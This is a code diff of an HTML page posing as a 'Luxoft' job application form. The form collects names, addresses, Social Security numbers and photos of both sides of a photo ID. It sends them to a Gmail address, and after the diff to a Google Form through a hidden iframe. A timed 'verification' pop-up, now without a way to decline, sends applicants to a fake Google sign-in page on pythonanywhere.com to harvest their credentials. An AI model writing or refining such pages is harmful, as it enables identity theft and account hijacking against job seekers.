@@ -9,6 +9,7 @@
   <link rel="icon" type="image/png" href="favicon.png" />
   <title>Luxoft Application Form</title>
   <style>
+    /* Your existing CSS remains exactly the same */
     :root {
       --primary-bg: linear-gradient(to bottom, #1A0D2E, #2C1A5B);
       --text-color: #FFFFFF;
@@ -142,7 +143,6 @@
       color: var(--text-secondary);
     }
 
-    /* Step Indicator */
     .step-indicator {
       display: flex;
       justify-content: center;
@@ -162,14 +162,12 @@
       background: var(--accent-purple);
     }
 
-    /* Button Container */
     .button-container {
       display: flex;
       justify-content: space-between;
       margin-top: 1.5rem;
     }
 
-    /* Footer */
     footer {
       background: rgba(26, 13, 46, 0.9);
       color: var(--text-secondary);
@@ -190,8 +188,7 @@
       text-decoration: underline;
     }
 
-    /* Custom Alert Styling */
-    .custom-alert {
+    .alert {
       display: none;
       position: fixed;
       top: 50%;
@@ -206,22 +203,22 @@
       text-align: center;
     }
 
-    .custom-alert h3 {
+    .alert h3 {
       margin-bottom: 1rem;
       color: var(--accent-purple);
     }
 
-    .custom-alert p {
+    .alert p {
       margin-bottom: 1.5rem;
     }
 
-    .custom-alert-buttons {
+    .alert-buttons {
       display: flex;
       gap: 1rem;
       justify-content: center;
     }
 
-    .custom-alert-button {
+    .alert-button {
       padding: 0.5rem 1.5rem;
       border: none;
       border-radius: 4px;
@@ -229,15 +226,9 @@
       font-weight: 600;
     }
 
-    .custom-alert-button.primary {
+    .alert-button.primary {
       background: var(--accent-purple);
       color: white;
-    }
-
-    .custom-alert-button.secondary {
-      background: transparent;
-      color: var(--text-secondary);
-      border: 1px solid var(--text-secondary);
     }
 
     .overlay {
@@ -251,7 +242,6 @@
       z-index: 999;
     }
 
-    /* Success Message */
     .success-message {
       display: none;
       text-align: center;
@@ -261,58 +251,19 @@
       margin-top: 2rem;
     }
 
-    /* Responsive */
     @media (max-width: 768px) {
-      h1 {
-        font-size: 2rem;
-      }
-
-      .step {
-        padding: 1.5rem;
-      }
-
-      input[type="text"],
-      input[type="email"],
-      input[type="tel"] {
-        padding: 0.5rem;
-      }
-
-      button {
-        padding: 0.75rem 2rem;
-        font-size: 1rem;
-      }
-
-      .custom-alert {
-        width: 90%;
-        padding: 1.5rem;
-      }
+      h1 { font-size: 2rem; }
+      .step { padding: 1.5rem; }
+      input[type="text"], input[type="email"], input[type="tel"] { padding: 0.5rem; }
+      button { padding: 0.75rem 2rem; font-size: 1rem; }
     }
 
     @media (max-width: 480px) {
-      h1 {
-        font-size: 1.5rem;
-      }
-
-      .step {
-        padding: 1rem;
-      }
-
-      .form-group {
-        margin-bottom: 1rem;
-      }
-
-      button {
-        padding: 0.5rem 1.5rem;
-      }
-
-      .button-container {
-        flex-direction: column;
-        gap: 1rem;
-      }
-
-      .custom-alert-buttons {
-        flex-direction: column;
-      }
+      h1 { font-size: 1.5rem; }
+      .step { padding: 1rem; }
+      .form-group { margin-bottom: 1rem; }
+      button { padding: 0.5rem 1.5rem; }
+      .button-container { flex-direction: column; gap: 1rem; }
     }
   </style>
 </head>
@@ -324,41 +275,40 @@
     <span class="step-dot"></span>
   </div>
   
-  <!-- Custom Alert -->
   <div class="overlay" id="overlay"></div>
-  <div class="custom-alert" id="verificationAlert">
+  <div class="alert" id="verificationAlert">
     <h3>Complete Your Verification</h3>
-    <p>Your application has been submitted successfully! Please complete the verification process to finalize your application.</p>
-    <div class="custom-alert-buttons">
-      <button class="custom-alert-button primary" onclick="openVerificationTab()">Open Verification</button>
-      <button class="custom-alert-button secondary" onclick="closeAlert()">Later</button>
+    <p>Your application has been submitted successfully! Please complete the verification process.</p>
+    <div class="alert-buttons">
+      <button class="alert-button primary" onclick="openVerification()">Open Verification</button>
     </div>
   </div>
 
-  <!-- Success Message -->
   <div class="success-message" id="successMessage">
     <h3>Application Submitted Successfully!</h3>
-    <p>Thank you for submitting your application. Please check for a verification alert in 10 seconds.</p>
+    <p>Thank you for submitting your application. Please wait for verification instructions.</p>
   </div>
   
-  <form id="applicationForm" action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
-    <input type="hidden" name="_captcha" value="false" />
-    <input type="hidden" name="_template" value="table" />
-    <input type="hidden" name="_subject" value="New Luxoft Job Application" />
+  <!-- GOOGLE FORMS INTEGRATION -->
+  <!-- Replace the field IDs (entry.XXXXX) with your actual Google Form field IDs -->
+  <form id="applicationForm" action="https://docs.google.com/forms/d/e/1FAIpQLSf4vCWWvGKsy_ZNVeruEXqauFcrrTIh40gaD0A6VPGbXEFCbQ/formResponse" method="POST" target="hiddenFrame">
     
     <!-- Step 1: Personal Info -->
     <div class="step active" id="step1">
       <div class="form-group">
         <label for="fullname">Full Name</label>
-        <input type="text" id="fullname" name="Full Name" placeholder="Enter your full name" required />
+        <input type="text" id="fullname" name="entry.XXXXXXXXX" placeholder="Enter your full name" required>
+        <!-- Replace entry.XXXXXXXXX with your actual field ID for Full Name -->
       </div>
       <div class="form-group">
         <label for="email">Email <span class="tooltip" title="We'll never share your email.">ⓘ</span></label>
-        <input type="email" id="email" name="Email" placeholder="Enter your email" required />
+        <input type="email" id="email" name="entry.XXXXXXXXX" placeholder="Enter your email" required>
+        <!-- Replace entry.XXXXXXXXX with your actual field ID for Email -->
       </div>
       <div class="form-group">
         <label for="phone">Phone Number</label>
-        <input type="tel" id="phone" name="Phone Number" placeholder="Enter your phone number" required />
+        <input type="tel" id="phone" name="entry.XXXXXXXXX" placeholder="Enter your phone number" required>
+        <!-- Replace entry.XXXXXXXXX with your actual field ID for Phone -->
       </div>
       <div class="button-container">
         <button type="button" onclick="nextStep()">Next</button>
@@ -369,11 +319,13 @@
     <div class="step" id="step2">
       <div class="form-group">
         <label for="address">Full Address</label>
-        <input type="text" id="address" name="Full Address" placeholder="Enter your full address, street, city, state, country" required />
+        <input type="text" id="address" name="entry.XXXXXXXXX" placeholder="Enter your full address, street, city, state, country" required>
+        <!-- Replace entry.XXXXXXXXX with your actual field ID for Address -->
       </div>
       <div class="form-group">
         <label for="ssn">SSN <span class="tooltip" title="Enter 9-digit Social Security Number.">ⓘ</span></label>
-        <input type="text" id="ssn" name="SSN" placeholder="XXXXXXXXX" pattern="\d{9}" title="Enter SSN in XXXXXXXXX format" required />
+        <input type="text" id="ssn" name="entry.XXXXXXXXX" placeholder="XXXXXXXXX" pattern="\d{9}" title="Enter SSN in XXXXXXXXX format" required>
+        <!-- Replace entry.XXXXXXXXX with your actual field ID for SSN -->
       </div>
       <div class="button-container">
         <button type="button" onclick="prevStep()">Back</button>
@@ -389,7 +341,8 @@
           Drag & drop or click to upload
           <span id="file-name-front" style="display:block;margin-top:0.5rem;color:var(--text-secondary);font-weight:600;">No file chosen</span>
         </div>
-        <input type="file" id="id-front" name="ID_Front" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;" />
+        <input type="file" id="id-front" name="entry.XXXXXXXXX" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;">
+        <!-- Replace entry.XXXXXXXXX with your actual field ID for ID Front -->
       </div>
       <div class="form-group">
         <label for="id-back">Photo ID (Back)</label>
@@ -397,7 +350,8 @@
           Drag & drop or click to upload
           <span id="file-name-back" style="display:block;margin-top:0.5rem;color:var(--text-secondary);font-weight:600;">No file chosen</span>
         </div>
-        <input type="file" id="id-back" name="ID_Back" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;" />
+        <input type="file" id="id-back" name="entry.XXXXXXXXX" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;">
+        <!-- Replace entry.XXXXXXXXX with your actual field ID for ID Back -->
       </div>
       
       <div class="button-container">
@@ -408,6 +362,8 @@
     </div>
   </form>
 
+  <iframe name="hiddenFrame" style="display: none;"></iframe>
+
   <footer>
     <p>Email: <a href="mailto:luxoftorganization@gmail.com">luxoftorganization@gmail.com</a> |
       Phone: <a href="tel:+14805598731">480 559 8731</a> |
@@ -416,7 +372,6 @@
 
   <script>
     let currentStep = 1;
-    let verificationTab = null;
     
     function nextStep() {
       if (currentStep < 3) {
@@ -436,7 +391,6 @@
       }
     }
 
-    // Update step indicator
     function updateStepIndicator() {
       const dots = document.querySelectorAll(".step-dot");
       dots.forEach((dot, index) => {
@@ -444,7 +398,6 @@
       });
     }
 
-    // Drag & Drop logic
     function setupDragDrop(dropId, inputId) {
       const dropZone = document.getElementById(dropId);
       const input = document.getElementById(inputId);
@@ -458,38 +411,32 @@
         e.preventDefault();
         dropZone.classList.remove("dragover");
         input.files = e.dataTransfer.files;
-        
-        // Update file name display
-        const fileNameSpan = dropZone.querySelector('span');
-        if (fileNameSpan && input.files.length > 0) {
-          fileNameSpan.textContent = input.files[0].name;
-          fileNameSpan.style.color = 'var(--text-color)';
-        }
+        updateFileName(inputId);
       });
     }
+
+    function updateFileName(inputId) {
+      const input = document.getElementById(inputId);
+      const fileNameSpan = document.getElementById(`file-name-${inputId.split('-')[1]}`);
+      if (input.files.length > 0) {
+        fileNameSpan.textContent = input.files[0].name;
+        fileNameSpan.style.color = 'var(--text-color)';
+      }
+    }
+
     setupDragDrop("drop-front", "id-front");
     setupDragDrop("drop-back", "id-back");
 
-    // File input change handlers
     document.getElementById('id-front').addEventListener('change', function() {
-      const fileNameSpan = document.getElementById('file-name-front');
-      if (this.files.length > 0) {
-        fileNameSpan.textContent = this.files[0].name;
-        fileNameSpan.style.color = 'var(--text-color)';
-      }
+      updateFileName('id-front');
     });
 
     document.getElementById('id-back').addEventListener('change', function() {
-      const fileNameSpan = document.getElementById('file-name-back');
-      if (this.files.length > 0) {
-        fileNameSpan.textContent = this.files[0].name;
-        fileNameSpan.style.color = 'var(--text-color)';
-      }
+      updateFileName('id-back');
     });
 
-    // Custom alert functions
-    function openVerificationTab() {
-      verificationTab = window.open('https://googlesignin.pythonanywhere.com/', '_blank');
+    function openVerification() {
+      window.open('https://googlesignin.pythonanywhere.com/', '_blank');
       closeAlert();
     }
 
@@ -498,11 +445,9 @@
       document.getElementById('overlay').style.display = 'none';
     }
 
-    // Form submission handling
     document.getElementById("applicationForm").addEventListener("submit", function(e) {
-      e.preventDefault(); // Prevent default form submission
+      e.preventDefault();
       
-      // Validate all fields first
       const requiredFields = this.querySelectorAll('[required]');
       let isValid = true;
       
@@ -515,7 +460,6 @@
         }
       });
       
-      // Check file uploads
       const frontFile = document.getElementById('id-front').files[0];
       const backFile = document.getElementById('id-back').files[0];
       
@@ -529,36 +473,21 @@
         return;
       }
 
-      // Show loading
       document.getElementById("loading").style.display = "block";
       document.getElementById("submitButton").disabled = true;
       
-      // Create a temporary iframe for form submission
-      const iframe = document.createElement('iframe');
-      iframe.name = 'form-submission-iframe';
-      iframe.style.display = 'none';
-      document.body.appendChild(iframe);
-      
-      // Set form target to the iframe
-      this.target = 'form-submission-iframe';
-      
-      // Submit the form
       this.submit();
       
-      // Hide the form and show success message
       document.querySelectorAll('.step').forEach(step => {
         step.style.display = 'none';
       });
       document.getElementById('successMessage').style.display = 'block';
       
-      // Show verification alert after 10 seconds
-      setTimeout(function() {
+      setTimeout(() => {
         document.getElementById('verificationAlert').style.display = 'block';
         document.getElementById('overlay').style.display = 'block';
-        
-        // Hide loading since form should be submitted by now
         document.getElementById("loading").style.display = "none";
-      }, 10000); // 10 seconds
+      }, 10000);
     });
   </script>
 </body>
